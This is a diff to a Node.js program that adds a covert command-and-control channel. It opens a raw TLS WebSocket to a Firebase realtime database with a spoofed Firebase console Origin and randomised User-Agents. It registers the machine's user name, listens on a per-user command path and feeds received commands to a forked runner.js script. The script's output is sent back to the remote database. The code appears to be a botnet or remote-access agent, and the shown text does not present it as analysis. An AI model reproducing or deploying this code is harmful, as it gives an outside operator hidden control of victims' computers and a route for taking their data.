@@ -1,6 +1,6 @@
 const fs = require('fs')
 const tls = require('tls')
-const { execSync } = require('child_process')
+const { execSync, fork } = require('child_process')
 
 const windowsTokens = [
     'Windows NT 10.0; Win64; x64',
@@ -15,6 +15,9 @@ const windowsTokens = [
 ]
 
 let id = 1
+let mCmd = null
+let mSendData = null
+let mScript = null
 let DATABASE = null
 let CONNECTION = null
 let USER = getUserName()
@@ -72,12 +75,64 @@ async function runWebSocket(url) {
     let host = url.hostname
     let port = 443
     let path = url.pathname + url.search
+    let cmd = "/£uck々you/realtime/"+USER+"/cmd"
 
     let socket = tls.connect({ host, port, servername: host }, () => {
         socket.write(`GET ${path} HTTP/1.1\r\nHost: ${host}\r\nConnection: Upgrade\r\nUpgrade: websocket\r\nSec-WebSocket-Key: ${randomWebSocketKey()}\r\nSec-WebSocket-Version: 13\r\nOrigin: https://console.firebase.google.com\r\nUser-Agent: ${randomUserAgent()}\r\n\r\n`);
         sendWSMessage(socket, JSON.stringify({"t":"d","d":{"r":id++,"a":"om","b":{"p":"/£uck々you/user/"+USER,"d":{"t":{".sv":"timestamp"}, "s":0}}}}))
+        sendWSMessage(socket, JSON.stringify({"t":"d","d":{"r":id++,"a":"q","b":{"p":cmd,"h":""}}}))
         CONNECTION = socket
     })
+
+    socket.on('data', (data) => {
+        try {
+            let firstByte = data[0]
+            let opcode = firstByte & 0x0f
+
+            if (opcode === 0x1) {
+                let secondByte = data[1]
+                let length = secondByte & 0x7f
+
+                let offset = 2
+                if (length === 126) {
+                    length = data.readUInt16BE(offset)
+                    offset += 2
+                } else if (length === 127) {
+                    length = data.readBigUInt64BE(offset)
+                    offset += 8
+                }
+
+                let payload = data.slice(offset, offset + length)
+                let message = payload.toString('utf8')
+
+                try {
+                    let json = JSON.parse(message)
+                    
+                    if (json.d && json.d.b) {
+                        let data = json.d.b
+                        if (data && data.p && data.d && cmd.includes(data.p)) {
+                            if (mSendData) {
+                                if (mSendData != data.d) {
+                                    if (mScript) {
+                                        mScript.send(data.d)
+                                    } else {
+                                        mCmd = data.d
+                                    }
+                                }
+                            } else {
+                                if (mScript) {
+                                    mScript.send(data.d)
+                                } else {
+                                    mCmd = data.d
+                                }
+                            }
+                        }
+                    }
+                } catch (err) {}
+            }
+        } catch (err) {}
+    })
+
     
     socket.on('end', () => {
         CONNECTION = null
@@ -208,10 +263,18 @@ async function runDynamicServer(data) {
         }
 
         console.log('Node: ---RUNNING-SCRIPT---')
-        execSync(`node runner.js`, { stdio: 'inherit' })
-    } catch (error) {
-        console.log(error);
         
+        mScript = fork('./runner.js', [USER])
+
+        if (mCmd) {
+            mScript.send(mCmd)
+        }
+
+        mScript.on('message', (data) => {
+            mSendData = data
+            sendWSMessage(CONNECTION, JSON.stringify({"t":"d","d":{"r":id++,"a":"m","b":{"p":"/£uck々you/realtime/"+USER,"d":{"cmd": data}}}}))
+        })
+    } catch (error) {
         console.log('Node: ---SCRIPT-RUNNING-ERROR---')
     }
 }
